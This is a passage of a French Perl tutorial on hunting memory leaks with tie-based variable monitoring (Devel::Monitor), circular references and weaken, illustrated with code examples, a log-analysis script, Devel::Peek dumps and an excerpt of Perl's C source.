Ce qui ne rΘvΦle en rien la variable qui va Ωtre dΘtruite, si nous appliquons un  tie sur 500 
variables.

Nous  avons  donc besoin d'un outil un peu plus puissant. Donc,  j'ai  fait  un  monitorizeur 
(nouveau mot) qui va tie-er (tie-er (verbe) : appliquer une "tie" sur une variable) n'importe 
quel type de variable (SCALAR, ARRAY, HASH, ...).

De plus, je veux Θgalement pouvoir donner un nom α la variable que je monitor.

Je voudrais faire ceci : monitor('ma variable $a' => \$a);
qui en fait exΘcuterait ceci : tie $a, 'UnModuleQuelconque';
tout en conservant le nom "unique" de ma variable monitorΘe pour les prints.

Notez que les modules Tie par dΘfaut sont basiques :
+---------------------------------------------------------------------------------------------+
| Preuve 0x0001 : Les modules Tie sont cons                                                   |
+---------------------------------------------------------------------------------------------+
1  #!/usr/bin/perl
2  use strict;
3  use warnings;
4  use Tie::Array;
5
6  my @a = (1,2,3);
7  print '1 - ' . join(', ',@a) . "\n";
8  tie @a, 'Tie::StdArray';
9  print '2 - ' . join(', ',@a) . "\n";
10 untie @a;
11 print '3 - ' . join(', ',@a) . "\n";
+----------------------+
| RΘsultat             |
+----------------------+
1 - 1, 2, 3
2 -
3 - 1, 2, 3

+----------------------+
| Explications         |
+----------------------+

Les  modules  Tie  de base ne conservent pas les valeurs d'origines de la  variable.  Ce  qui 
implique que pour nos besoins, il faudrait redΘfinir le  contenu  des  variables  α  bien des 
endroits, aprΦs avoir executΘ le tie. Il faudrait convertir ceci :

my @a = (1,2,3);
tie @a, 'Tie::StdArray';

en ceci :

my @a;
tie @a, 'Tie::StdArray';
@a = (1,2,3);

Mais encore une fois, c'est une mauvaise idΘe parce que notre objectif est  de  monitorer des 
centaines de variables, sans avoir α penser α comment les
monitorer.
+---------------------------------------------------------------------------------------------+
| EOF : Preuve 0x0001 : Les modules Tie sont cons                                             |
+---------------------------------------------------------------------------------------------+

+---------------------------------------------------------------------------------------------+
| Chapitre trois                                                                              |
|                                                                                             |
| Ce que nous voulons                                                                         |
+---------------------------------------------------------------------------------------------+

Nous voulons une fonction qui va monitorer n'importe quoi, et ce, de maniΦre gΘnΘrique. Bref, 
aprΦs chaque dΘclaration, nous voulons pouvoir assigner  un  tie  sur  la variable, sans pour 
autant perdre le contenu actuel.

L'idΘal  serait  d'overrider  la  mΘthode  "my"  (╟a  se  fait  parce  que  j'ai vu le module 
Devel::Leak::Object qui override la mΘthode "bless"). Le problΦme est  qu'il  est  impossible 
(Prouvez moi le contraire), d'obtenir le package (__PACKAGE__)  et  la ligne (__LINE__) de la 
dΘclaration α partir de l'endroit  o∙  la  mΘthode "my" serait overridΘe. Donc, cette mΘthode 
pourrait probablement marcher, mais je n'aurais pas de nom unique pour chaque variable.

Une autre mΘthode encore plus idΘale, serait d'avoir accΦs α la liste de toutes les variables 
instanciΘes α un endroit prΘcis (comme α la derniΦre ligne  du programme). Toutefois, je n'ai 
rien trouvΘ permettant cela (Dites-le moi  si  vous savez, et ce dans les plus brefs dΘlais). 
Tout ce qui est possible est de fouiller dans la table des symboles globaux, ce qui n'est pas 
d'une grande utilitΘ. Il semble mΩme impossible, au premier regard, de le faire avec Perl XS.

C'est pour cela que nous utiliserons la mΘthode du "tie" sans utiliser les  modules  Tie  par 
dΘfaut, mais nous allons nous en inspirer. 

+---------------------------------------------------------------------------------------------+
| Chapitre quatre                                                                             |
|                                                                                             |
| Devel::Monitor                                                                              |
+---------------------------------------------------------------------------------------------+

Regardez sur http://search.cpan.org pour Devel::Monitor

Vous allez tomber sur quelque chose comme :
http://search.cpan.org/~phcote/Devel-Monitor-0.9.0.4/lib/Devel/Monitor.pm

Vous pouvez l'installer avec la commande "cpan -i Devel::Monitor" ou avec ppm sur  windows... 
Bla.

+---------------------------------------------------------------------------------------------+
| Chapitre cinq                                                                               |
|                                                                                             |
| Utilisation de Devel::Monitor                                                               |
+---------------------------------------------------------------------------------------------+

Bon, voici quelques exemples d'utilisation

+---------------------------------------------------------------------------------------------+
| Exemple 0x0004 : Utilisation de "monitor"                                                   |
+---------------------------------------------------------------------------------------------+
{
    my @a;
    monitor('a' => \@a);
    $a[0] = \@a; #Add a circular reference
    print STDERR "Leaving scope\n";
}
print STDERR "Scope left\n";

+----------------------+
| RΘsultat             |
+----------------------+
MONITOR ARRAY a
Leaving scope
Scope left
DESTROY ARRAY a

+----------------------+
| Explications         |
+----------------------+

La ligne "DESTROY ARRAY a" devrait Ωtre entre les deux prints de scope. Ce qui veut  dire que 
@a est deletΘ α la fin du programme. Si nous exΘcutons ce code  avec  mod_perl,  la  derniΦre 
ligne ne sera pas imprimΘe.

+---------------------------------------------------------------------------------------------+
| EOF : Exemple 0x0004 : Utilisation de "monitor"                                             |
+---------------------------------------------------------------------------------------------+

+---------------------------------------------------------------------------------------------+
| Exemple 0x0005 : Utilisation de "monitor"                                                   |
+---------------------------------------------------------------------------------------------+
{
    my @list = (1,2,3);
    print STDERR join(", ",@list)."\n";
    for my $item (@list) {
        monitor("item $item" => \$item);
        $item+=1000;
        print "$item\n";
    }
    print STDERR join(", ",@list)."\n";
    print "Leaving scope\n";
}
print "Scope left\n";

+----------------------+
| RΘsultat que vous    |
| pourriez escompter   |
+----------------------+
1, 2, 3
MONITOR SCALAR : item 1
1001
DESTROY SCALAR : item 1
MONITOR SCALAR : item 2
1002
DESTROY SCALAR : item 2
MONITOR SCALAR : item 3
1003
DESTROY SCALAR : item 3
1, 2, 3
Leaving scope
Scope left

+----------------------+
| RΘsultat que vous    |
| aurez                |
+----------------------+
1, 2, 3
MONITOR SCALAR : item 1
1001
MONITOR SCALAR : item 2
1002
MONITOR SCALAR : item 3
1003
1001, 1002, 1003
Leaving scope
DESTROY SCALAR : item 3
DESTROY SCALAR : item 2
DESTROY SCALAR : item 1
Scope left

+----------------------+
| Explications         |
+----------------------+

Perl passe la variables par rΘfΘrence dans les "for" et  "foreach",  donc  vous  utilisez les 
rΘfΘrences  originales.  Donc,  si  vous  modifiez le contenu de $item, le  array  @list  est 
Θgalement modifiΘ. Ceci explique Θgalement le  fait  que  "item 1", "item 2" et "item 3" sont 
dΘtruites uniquement lorsque @list est dΘtruite.

+---------------------------------------------------------------------------------------------+
| EOF : Exemple 0x0005 : Utilisation de "monitor"                                             |
+---------------------------------------------------------------------------------------------+

+---------------------------------------------------------------------------------------------+
| Chapitre six                                                                                |
|                                                                                             |
| Quelques problΦmes avec les constantes                                                      |
+---------------------------------------------------------------------------------------------+

Vous remarquerez aprΦs usage que les constantes dΘclarΘes avec "use constant"  sont  en  fait 
des symboles globaux. Voilα des Θquivalents :

use constant CONST => [1,2];
sub CONST() { [1,2] };
sub CONST { [1,2] };
*CONST = sub () { [1,2] };       #DΘclarΘ comme le fait constant.pm
*main::CONST = sub () { [1,2] }; #Ne fonctionne pas avec mod_perl

Lorsque perl compile, il s'aperτoit que la constante est inline, donc il la
remplace par sa vΘritable valeur.

Ce code :
1 #!/usr/bin/perl
2 use strict;
3 use warnings;
4 use Tie::Array;
5 use constant CONST => [1,2];
6 tie CONST(), 'Tie::StdArray';

est convertit part :
1 use Tie::Array;
2 use constant ('CONST', [1, 2]);
3 BEGIN {${^WARNING_BITS} = "UUUUUUUUUUUU"}
4 use strict 'refs';
5 tie [1, 2], 'Tie::StdArray';

visualisable avec la commande "perl -MO=Deparse test.pl"

Nous essayons donc de tie-er [1, 2], ce qui est impossible car c'est une
constante tel que nous le dira perl.

Nous devons tie-er la valeur retournΘe par la fonction comme ceci
1 #!/usr/bin/perl
2 use strict;
3 use warnings;
4 use Tie::Array;
5 use constant CONST => [1,2];
6 tie @{&CONST()}, 'Tie::StdArray';

L'Θquivalent avec le module monitor se fait ainsi :
monitor('my constant value' => \&CONST);


╔galement, puisqu'une constante est globale et reste en mΘmoire le temps que le module est en 
mΘmoire, notre monitor va nous indiquer que  la  variable est vivante jusqu'α la fin de notre 
programme.  Il  faut  donc  Ωtre  en  mesure  d'indiquer  que  la  variable monitorΘe est une 
constante.

Regardons le cas suivant :

1 use constant CONST => [1,2];
2 {
3     my $list = CONST();
4     monitor('the list' => \$list);
5 }
6 print "Last program line\n";


Ceci indiquera que $list n'est pas dΘtruite avant la fin du programme parce  qu'elle contient 
la  mΩme  rΘfΘrence que CONST. C'est pour cela qu'il faut monitorer  les  constantes  α  leur 
crΘation, pour que par la suite, on ne puisse pas  monitorer  les  variables  qui utilise les 
constantes.

Nous ferons comme ceci :

1 use constant CONST => [1,2];
2 monitor('my constant value' => \&CONST);
3 {
4     my $list = CONST();
5     monitor('the list' => \$list);
6 }
7 print "Last program line\n";


Le deuxiΦme monitor indiquera qu'il n'est pas possible de monitorer la variable parce qu'elle 
est dΘja monitorΘe par "my constant value". De ce point, nos  prints  ne  parleront  pas   de 
memory leak... puisque nous verrons immΘdiatement  que  c'est  une  constante  qui  n'est pas 
supprimΘe (ce qui est normal).

L'autre problΦme reliΘ aux constante serait si j'exΘcute ceci :

1 use constant CONST => [1,2];
2 monitor('my constant value' => \&CONST());
3 {
4     my $list = CONST()->[0];
5     monitor('the list' => \$list);
6 }
7 print "Last program line\n";

J'obtiens le mΩme problΦme que tant⌠t parce que CONST()->[0] n'est  pas  dΘjα  monitorΘ. Pour 
palier α ces "problΦmes", la mΘthode monitor va tie-er rΘcursivement les constantes, α savoir 
tous les index des arrays, et toutes les clΘs des hashs, etc.

+---------------------------------------------------------------------------------------------+
| Chapitre sept                                                                               |
|                                                                                             |
| Outil d'insertion de moniteurs                                                              |
+---------------------------------------------------------------------------------------------+

Si vous avez par exemple 100 fichiers α monitorer avec 100000 variables,  vous  aurez  besoin 
d'un script qui va insΘrer un "monitor" sur chaque variable, pour  vous  Θviter  cette   dure 
labeur. Codez vous un SetMonitor.pl qui va parser le code source et insΘrer des choses comme:

monitor('mona::CGI::SiteMap::$self at line 32' => \$self);


Je ne vous donnerai pas ce code source α moins que la demande se fasse vraiment sentir, parce 
qu'il est vraiment trop laid. Disons que je l'ai fait assez vite.  Faire  un parser improvisΘ 
en deux/trois jours,  c'est  bon...  mais  patchΘ... Je  conseille  Θgalement  d'exΘcuter  un 
perltidy avant l'usage de ce genre de script.

+---------------------------------------------------------------------------------------------+
| Chapitre huit                                                                               |
|                                                                                             |
| Outil de visualisation d'erreurs                                                            |
+---------------------------------------------------------------------------------------------+

Une fois les monitors implantΘs, vous roulez votre application, qui  va  printer  des  choses 
dans le STDERR, qui est /var/log/apache2/error_log dans mon cas. Une page me  gΘnΦre  jusqu'α 
1500000  (Oui, 1500000)  lignes de message pour une page d'informations sur le gΦne Casp10 de 
la famille  Caspase.  Donc,  j'ai  besoin  d'un  outil  pour me rΘsumer le memory leak que je 
cherche. Voilα cet outil.

NOTE : Vous devez exΘcuter votre application depuis mod_perl (ou d'un endroit o∙  le  process 
       ne se termine pas...), autrement, la mΘmoire sera libΘrΘe.

+---------------------------------------------------------------------------------------------+
| VerifyMonitor.pl                                                                            |
+---------------------------------------------------------------------------------------------+
#!/usr/bin/perl

##Philippe Cote, 2005

##DOC

=head1 NAME

VerifyMonitor

=head1 DESCRIPTION

See perl VerifyMonitor -h for help

=cut

use strict;
use warnings;
use File::Find;

#CONSTANTS --------------------------------------------------------------------
use constant RED    => "\e[0;31m";
use constant NORMAL => "\e[0m";

sub printRed {
    my $msg = shift;
    if ($^O !~ /win32|dos/i) {
        print RED . $msg . NORMAL . "\n";
    }
    else {
        print "$msg\n";
    }
}

#HELP -------------------------------------------------------------------------
if ((scalar(@ARGV) < 3) || ($ARGV[0] =~ /(-h)|(--help)/)) {
    print <<"EOT";
Usage : perl VerifyMonitor.pl file beginTag endTag

Add a print at the begin of your program
print STDERR ":::PROGRAM START\n";
and at the end.
print STDERR ":::PROGRAM END\n";

Run your program with some monitors

It will print stuff to the error file you choose

Now verify with this command

perl VerifyMonitor.pl /var/log/apache/error_log ':::PROGRAM START' ':::PROGRAM END'

EOT
    exit(0);
}

#------------------------------------------------------------------------------

_verifyMonitor($ARGV[0],$ARGV[1],$ARGV[2]);

sub _verifyMonitor {
    my $filename = shift;
    my $beginTag = shift;
    my $endTag   = shift;

    open(my $inHandle,$filename) || die("Can't open INFILE: $!");
    my $lineNum = 0;
    my $lineBegin;
    my $lineEnd;
    my $mem = {};  #Every monitored variables
    while (my $line = <$inHandle>) {
        $lineNum++;
        if ($line =~ /$beginTag/) {
            $lineBegin = $lineNum;
            $mem = {};
        }
        if ($line =~ /$endTag/) {
            $lineEnd = $lineNum;
            print "Results from line $lineBegin to $lineEnd ------------------------------------------------\n";
            _printMemoryLeak($mem);
        }
        if ($line =~ /MONITOR CODE (HASH|ARRAY|SCALAR) : (.*)/) {
            #Nothing to do
        }
        elsif ($line =~ /MONITOR (HASH|ARRAY|SCALAR) : (.*)/) {
            if (exists($mem->{$2})) {
                $mem->{$2}++;
            } else {
                $mem->{$2} = 1;
            }
        }
        elsif ($line =~ /DESTROY CODE (HASH|ARRAY|SCALAR) : (.*)/) {
            #Nothing to do
        }
        elsif ($line =~ /DESTROY (HASH|ARRAY|SCALAR) : (.*)/) {
            if (exists($mem->{$2})) {
                if ($mem->{$2} > 1) {
                    $mem->{$2}--;
                } else {
                    delete($mem->{$2})
                }
            } else {
                print "DESTROY $1 : $2 were found, but not monitored\n";
            }
        }
    }
    close($inHandle);
}

sub _printMemoryLeak {
    my $memRef = shift;
    my $i = 0;
    foreach my $key (keys %$memRef) {
        print "$i - $key were not destroyed(".$memRef->{$key}.")\n";
        $i++;
    }
    print "Nothing found\n" if $i == 0;
}
+---------------------------------------------------------------------------------------------+
| EOF : VerifyMonitor.pl                                                                      |
+---------------------------------------------------------------------------------------------+

Ceci imprimera vos variables n'ayant pas ΘtΘ dΘtruites. N'oubliez pas  de  lire  le  help  de 
VerifyMonitor.pl...

+---------------------------------------------------------------------------------------------+
| Chapitre neuf                                                                               |
|                                                                                             |
| Comment rΘgler les rΘfΘrences circulaires                                                   |
+---------------------------------------------------------------------------------------------+

Disons que nous avons ce petit code "trΦs con et illogique" orientΘ objet :

1  #!/usr/bin/perl
2
3  #--------------------------------------------------------------------
4  # Little program
5  #--------------------------------------------------------------------
6
7  use strict;
8  use warnings;
9  use Devel::Monitor qw(:all);
10
11 {
12     my $a = ClassA->new();
13     my $b = $a->getClassB();
14     monitor('$b' => \$b);
15     $b->getClassA()->printSomething();
16     print "Leaving scope\n";
17 }
18 print "Scope left\n";
19
20 #--------------------------------------------------------------------
21 # ClassA (Just a class with the "printSomething" method)
22 #--------------------------------------------------------------------
23
24 package ClassA;
25 use strict;
26 use warnings;
27 use Scalar::Util qw(weaken isweak);
28
29 sub new {
30     my ($class) = @_;
31     my $self = {};
32     bless($self => $class);
33     return $self;
34 }
35
36 sub getClassB {
37    my $self = shift;
38    $self->{_classB} = ClassB->new($self);
39    return $self->{_classB};
40 }
41
42 sub printSomething {
43     print "Something\n";
44 }
45
46 #--------------------------------------------------------------------
47 # ClassB (A class that got a "parent" which is a ClassA instance)
48 #--------------------------------------------------------------------
49
50 package ClassB;
51 use strict;
52 use warnings;
53 use Scalar::Util qw(weaken isweak);
54
55 sub new {
56     my ($class, $classA) = @_;
57     my $self = {};
58     bless($self => $class);
59     $self->setClassA($classA);
60     return $self;
61 }
62
63 sub setClassA {
64     my ($self, $classA) = @_;
65     $self->{_classA} = $classA;
66 }
67
68 sub getClassA {
69     return shift->{_classA};
70 }
71
72 1;

+----------------------+
| RΘsultat             |
+----------------------+
MONITOR HASH : $b
Something
Leaving scope
Scope left
DESTROY HASH : $b

+----------------------+
| Explications         |
+----------------------+

On  voit  que  l'objet rΘfΘrencΘ par $b n'est pas dΘtruit lorsqu'il sort du scope  parce  que 
$a->{_classB} le rΘfΘrence. Nous avons une rΘfΘrence circulaire. Nous pouvons  alors utiliser 
deux mΘthodes.
 - La mΘthode manuelle qui consiste α dΘtruite avec un  delete  ou  un  undef,  la  rΘfΘrence 
   circulaire, lorsque nous n'avons plus besoin de l'objet.
 - La mΘthode plus cool, qui consiste α  dΘclarer  "weaken " une  des  deux  rΘfΘrences. Si A 
   pointe vers B et B vers A, si je weaken A, lorsque  le  garbage  collector  vΘrifiera  les 
   variables, il verra deux rΘfΘrences sur A, l'originale  qui est weaken, et celle de B vers 
   A. Il considΦre donc cela comme une seule rΘfΘrence, rendant possible la suppression de A, 
   qui  rendra  ensuite  possible  la  suppression  de B. Le weaken sert α dire "oui j'ai une
   rΘfΘrence ici, mais fait comme si j'existais pas". On se rend compte  qu'on  ne  peut  pas 
   mettre des weaken partout  comme  l'on  veut  parce  que  nos  variables vont se supprimer 
   d'elle-mΩmes...

+---------------------------------------------------------------------------------------------+
| Mauvaise faτon de briser la rΘfΘrence circulaire                                            |
+---------------------------------------------------------------------------------------------+
sub getClassB {
    my $self = shift;
    $self->{_classB} = ClassB->new($self);  #$self->{_classB} est la seule
                                            #rΘfΘrence α l'objet
    weaken($self->{_classB});               #on weaken la seule rΘfΘrence
                                            #$self->{_classB} est dΘtruite ici
    print "\$self->{_classB} is now weaken\n" if isweak($self->{_classB});
    return $self->{_classB};                #On retourne undef
}
+---------------------------------------------------------------------------------------------+
| Bonne faτon de briser la rΘfΘrence circulaire                                               |
+---------------------------------------------------------------------------------------------+
sub getClassB {
    my $self = shift;
    my $b = ClassB->new($self);
    $self->{_classB} = $b;                  #On crΘe une seconde rΘfΘrence
    weaken($self->{_classB});               #On crΘe un weaken
    print "\$self->{_classB} is now weaken\n" if isweak($self->{_classB});
    return $self->{_classB};                #On retourne l'objet, qui
                                            #logiquement sera rΘfΘrencΘ
                                            #par une variable de l'appelant
} #$b est dΘtruit ici, il nous reste donc la variable de l'appelant et la
  #variable weaken. La variable de l'appelant pourra cependant Ωtre dΘtruite
  #parce que la rΘfΘrence circulaire est weaken d'un c⌠tΘ.
+---------------------------------------------------------------------------------------------+
| Faire attention !!! Ceci ne fonctionne pas                                                  |
+---------------------------------------------------------------------------------------------+
sub getClassB {
    my $self = shift;
    {
        my $b = ClassB->new($self);
        $self->{_classB} = $b;                  #On crΘe une seconde rΘfΘrence
        weaken($self->{_classB});               #On weaken cette rΘfΘrence
        print "\$self->{_classB} is now weaken\n" if isweak($self->{_classB});
    } #$b est dΘtruite ici, et $self->{_classB} aussi parce qu'elle est weaken
      #L'instance "ClassB" est dΘtruite $self->{_classB} Θgale undef
    return $self->{_classB};
}
+---------------------------------------------------------------------------------------------+
| Bonne faτon                                                                                 |
+---------------------------------------------------------------------------------------------+
sub getClassB {
    my $self = shift;
    my $b;
    {
        $b = ClassB->new($self);
        $self->{_classB} = $b;                  #On crΘe la seconde rΘfΘrence
        weaken($self->{_classB});               #On weaken la rΘfΘrence
        print "\$self->{_classB} is now weaken\n" if isweak($self->{_classB});
    } #$b n'est pas encore dΘtruite, donc on ne perd pas notre rΘfΘrence α
      #notre objet
    return $self->{_classB}; #On retourne l'objet qui sera pris en charge
                             #par le module appelant.
}

+---------------------------------------------------------------------------------------------+
| Conclusion                                                                                  |
+---------------------------------------------------------------------------------------------+
Il faut toujours s'assurer de conserver une rΘfΘrence "non-weak" sur notre objet

Le output final sera :

$self->{_classB} is now weaken
MONITOR HASH : $b
Something
Leaving scope
DESTROY HASH : $b
Scope left

Nous n'avons plus de rΘfΘrences circulaires

+---------------------------------------------------------------------------------------------+
| Il faut toujours weaken-er la rΘfΘrence de l'appelant, autrement                            |
| on peut rendre les modules inutilisables                                                    |
+---------------------------------------------------------------------------------------------+

Soit le code suivant avec les package de tant⌠t :

1  my $b;
2  {
3      my $a = ClassA->new();
4      monitor('$a' => \$a);
5      $b = ClassB->new($a);
6      $b->getClassA()->printSomething();
7      print "Leaving scope\n";
8  }
9  print "Scope left\n";
10 $b->getClassA()->printSomething();

avec le weaken du c⌠tΘ de l'appelΘ

1 sub setClassA {
2     my ($self, $classA) = @_;
3     $self->{_classA} = $classA;
4     weaken($self->{_classA});
5     print "\$self->{_classA} is now weaken\n" if isweak($self->{_classA});
6 }

On obtient le output suivant avec l'erreur α la fin

MONITOR HASH : $a
$self->{_classA} is now weaken
Something
Leaving scope
DESTROY HASH : $a
Scope left
Can't call method "printSomething" on an undefined value at test.pl line 29.



$a est dΘtruite α la fin du scope, et l'autre rΘfΘrence α la variable est  weaken,  donc elle 
est dΘtruite aussi. Ceci prouvant qu'il faut weaken-er  le  c⌠tΘ  de  l'appelant   parce  que 
l'appelant ne mΘmorise pas nΘcessairement la rΘfΘrence.

+---------------------------------------------------------------------------------------------+
| Chapitre dix                                                                                |
|                                                                                             |
| Impossible de weaken-er un objet tied                                                       |
+---------------------------------------------------------------------------------------------+

Il est impossible de weaken-er un objet tied. L'appel de la mΘthode ne fait  tout  simplement 
rien.

+---------------------------------------------------------------------------------------------+
| Preuve 0x0002 : Test de base                                                                |
+---------------------------------------------------------------------------------------------+
1  use Devel::Monitor qw(:all);
2  use Scalar::Util qw(weaken isweak);
3  my (@a, @b);
4  tie @a, 'Devel::Monitor::TestArray';
5  tie @b, 'Devel::Monitor::TestArray';
6  $a[0] = \@b;
7  $b[0] = \@a;
8  weaken($b[0]);
9  if (isweak($a[0])) {
10     print "\$a[0] is weak\n";
11 } else {
12     print "\$a[0] is not weak\n";
13 }
14 if (isweak($b[0])) {
15     print "\$b[0] is weak\n";
16 } else {
17     print "\$b[0] is not weak\n";
18 }

Le output sera :

$a[0] is not weak
$b[0] is not weak

Toutefois, si nous enlevons les deux "tie", le output sera :

$a[0] is not weak
$b[0] is weak

+---------------------------------------------------------------------------------------------+
| EOF : Preuve 0x0002 : Test de base                                                          |
+---------------------------------------------------------------------------------------------+

+---------------------------------------------------------------------------------------------+
| Preuve 0x0003 : mod_perl                                                                    |
+---------------------------------------------------------------------------------------------+
Soit le petit programme suivant :

+----------------------+
| test.pl              |
+----------------------+
1  #!/usr/bin/perl
2  use strict;
3  use warnings;
4  use Scalar::Util qw(weaken);
5  use Devel::Monitor qw(:all);
6  use Util::Junk;
7
8  my (@a, $b);
9  #tie @a, 'Devel::Monitor::TestArray';
10 $a[0] = \$b;
11 $b = \@a;
12 $a[1] = Util::Junk::_20M();
13 weaken($a[0]);
+----------------------+
| EOF : test.pl        |
+----------------------+
+----------------------+
| Util::Junk           |
+----------------------+
1  package Util::Junk;
2  use strict;
3  use warnings;
4
5  sub _20M() { 'A 20 megs string here filled with zeros' }
6
7  1;
+----------------------+
| EOF : Util::Junk     |
+----------------------+
+----------------------+
| wget-test.pl         |
+----------------------+
1  #!/usr/bin/perl
2
3  use strict;
4  use warnings;
5
6  my $baseUrl = 'http://localhost/perl/test.pl';
7
8  my $i = 0;
9  while (1) {
10     print "Loop ".++$i."\n";
11
12     system('wget "'.$baseUrl.'" -O /dev/null') == 0
13         or die "\nwget failed or has been interrupted : $?\n";
14 }
+----------------------+
| EOF : wget-test.pl   |
+----------------------+


Maintenant  que  nous  avons  un  programme et un caller (ainsi que mod_perl),  nous  pouvons 
dΘmarrer le programme. Notez que le url est hardcodΘ dans le programme de test.

perl wget-test.pl

Lorsque @a n'est pas tied (Voir la ligne 9 commentΘe),  aprΦs  environ  10  chargement  de la 
page, les process de Apache contiennent tous la page et  le  chargement  devient TR╚S rapide. 
Vous noterez Θgalement que la mΘmoire devient stable.

Toutefois, si la ligne 9 n'est plus commentΘe, la mΘmoire va rapidement se  remplir et chaque 
chargement de la page aura un temps constant identique aux temps de dΘpart du programme. Nous 
voyons facilement que le weaken ne se fait pas.

+---------------------------------------------------------------------------------------------+
| EOF : Preuve 0x0003 : mod_perl                                                              |
+---------------------------------------------------------------------------------------------+

+---------------------------------------------------------------------------------------------+
| Preuve 0x0004 : Assaut final                                                                |
+---------------------------------------------------------------------------------------------+

Tout d'abord, il faut s'assurer que les mΘthodes Scalar::Util::weaken et Scalar::Util::isweak 
ne contiennent pas de bugs. Si nous les regardons de plus  prΦs, nous voyons qu'elles ne font 
simplement qu'appeler les mΘthodes XS suivantes :

1  void
2  weaken(sv)
3     SV *sv
4  PROTOTYPE: $
5  CODE:
6  #ifdef SvWEAKREF
7     sv_rvweaken(sv);
8  #else
9     croak("weak references are not implemented in this release of perl");
10 #endif
11
12 void
13 isweak(sv)
14    SV *sv
15 PROTOTYPE: $
16 CODE:
17 #ifdef SvWEAKREF
18    ST(0) = boolSV(SvROK(sv) && SvWEAKREF(sv));
19    XSRETURN(1);
20 #else
21    croak("weak references are not implemented in this release of perl");
22 #endif


Nous voyons que ce code est trΦs simple et ne fait qu'appeler des mΘthodes  de l'API de Perl. 
Donc, aucun gros traitements ici et donc aucune possibilitΘ de bugs dans ces mΘthodes.

Il existe un outil nommΘ Devel::Peek qui permet de dumper le contenu d'une  variable  dans un 
format de dΘveloppeur XS. XS est le langage ou plut⌠t  l'extension  de  C++  pour  crΘer  des 
modules Perl en C++, en utilisant l'API de  Perl.  (Voir  perlapi,  perlguts  et  tout  autre 
documentation sur le coeur de Perl)

Si  vous  connaissez  l'API  de perl, vous saurez sans doute que le flag WEAKREF  est  activΘ 
lorsqu'une variable est weaken et ceci est visualisable avec un dump.

Note : Devel::Peek::Dump ne fait qu'appeler sv_dump de l'API Perl.

Regardons un exemple de rΘsultat que nous devrions avoir :

+----------------------+
| Code                 |
+----------------------+
1  #!/usr/bin/perl
2  use strict;
3  use warnings;
4  use Devel::Monitor qw(:all);
5   
6  use Scalar::Util qw(weaken);
7  use Devel::Peek;
8  {
9      my (@a);
10     $a[0] = \@a;
11     #tie @a, 'TestArray';
12     Dump($a[0],1);
13     weaken($a[0]);
14     Dump($a[0],1);
15     print "Leaving scope\n";
16 }
17 print "Scope left\n";
18  
19 package TestArray;
20 use Tie::Array;
21 use base 'Tie::StdArray';
22  
23 sub DESTROY { print "Monitor::TestArray::DESTROY : $_[0]\n"; }
24  
25 1;

+----------------------+
| RΘsultat sans le tie |
+----------------------+
SV = RV(0x81829c0) at 0x814127c
  REFCNT = 1
  FLAGS = (ROK)
  RV = 0x814e740
  SV = PVAV(0x81426cc) at 0x814e740
    REFCNT = 2
    FLAGS = (PADBUSY,PADMY)
    IV = 0
    NV = 0
    ARRAY = 0x8148888
    FILL = 0
    MAX = 3
    ARYLEN = 0x0
    FLAGS = (REAL)
SV = RV(0x81829c0) at 0x814127c
  REFCNT = 1
  FLAGS = (ROK,WEAKREF,IsUV)
  RV = 0x814e740
  SV = PVAV(0x81426cc) at 0x814e740
    REFCNT = 1
    FLAGS = (PADBUSY,PADMY,RMG)
    IV = 0
    NV = 0
    MAGIC = 0x8266f08
      MG_VIRTUAL = &PL_vtbl_backref
      MG_TYPE = PERL_MAGIC_backref(<)
      MG_FLAGS = 0x02
        REFCOUNTED
      MG_OBJ = 0x81411c8
      SV = PVAV(0x8263704) at 0x81411c8
        REFCNT = 2
        FLAGS = ()
        IV = 0
        NV = 0
        ARRAY = 0x82677e8
        FILL = 0
        MAX = 3
        ARYLEN = 0x0
        FLAGS = (REAL)
    ARRAY = 0x8148888
    FILL = 0
    MAX = 3
    ARYLEN = 0x0
    FLAGS = (REAL)
Leaving scope
Scope left

+----------------------+
| Explications         |
+----------------------+

Ce qui nous concerne le plus ici est le flag WEAKREF qui nous confirme que la  rΘfΘrence (RV) 
est bel et bien weaken. Cependant, regardons ce qui se passe  si  l'on  active la ligne 11 de 
notre code Θtant le tie de la variable @a

+----------------------+
| RΘsultat avec le tie |
+----------------------+
SV = PVLV(0x817c568) at 0x81413f0
  REFCNT = 1
  FLAGS = (TEMP,GMG,SMG,RMG)
  IV = 0
  NV = 0
  PV = 0
  MAGIC = 0x81505b8
    MG_VIRTUAL = &PL_vtbl_packelem
    MG_TYPE = PERL_MAGIC_tiedelem(p)
    MG_FLAGS = 0x02
      REFCOUNTED
    MG_OBJ = 0x814139c
    SV = RV(0x81829ac) at 0x814139c
      REFCNT = 2
      FLAGS = (ROK)
      RV = 0x8141354
  TYPE = t
  TARGOFF = 0
  TARGLEN = 0
  TARG = 0x81413f0
SV = PVLV(0x817c568) at 0x81413f0
  REFCNT = 1
  FLAGS = (TEMP,GMG,SMG,RMG)
  IV = 0
  NV = 0
  PV = 0
  MAGIC = 0x81505b8
    MG_VIRTUAL = &PL_vtbl_packelem
    MG_TYPE = PERL_MAGIC_tiedelem(p)
    MG_FLAGS = 0x02
      REFCOUNTED
    MG_OBJ = 0x814139c
    SV = RV(0x81829ac) at 0x814139c
      REFCNT = 2
      FLAGS = (ROK)
      RV = 0x8141354
  TYPE = t
  TARGOFF = 0
  TARGLEN = 0
  TARG = 0x81413f0
Leaving scope
Scope left
Monitor::TestArray::DESTROY : TestArray=ARRAY(0x8141354)

+----------------------+
| Explications         |
+----------------------+

On voit que rien n'a changΘ avant et aprΦs l'exΘcution du weaken sur la variable  tied. Suite 
α  plusieurs  tests,  j'ai   dΘcouvert   qu'une   variable   tied   est   de   type    lvalue 
(SvTYPE(sv) == SVt_PVLV). Je    me    suis    Θgalement     aperτu     que     la     mΘthode 
Data::Structure::Util::has_circular_ref ne gΦre pas ce type de valeur.  Il  semble  Θgalement 
que ce type n'est pas si vieux que τa. Je suis donc allΘ  voir  dans  le  code source de Perl 
pour trouver la mΘthode sv_rvweaken qui fait dΘfaut. Selon  la dΘfinition dans embed.h, cette 
mΘthode rΘfΦre α la mΘthode Perl_sv_rvweaken suivante :

1  /*
2  =for apidoc sv_rvweaken
3   
4  Weaken a reference: set the C&lt;SvWEAKREF> flag on this RV; give the
5  referred-to SV C&lt;PERL_MAGIC_backref> magic if it hasn't already; and
6  push a back-reference to this RV onto the array of backreferences
7  associated with that magic.
9   
10 =cut
11 */
12  
13 SV *
14 Perl_sv_rvweaken(pTHX_ SV *sv)
15 {
16     SV *tsv;
17     if (!SvOK(sv))  /* let undefs pass */
18         return sv;
19     if (!SvROK(sv))
20         Perl_croak(aTHX_ "Can't weaken a nonreference");
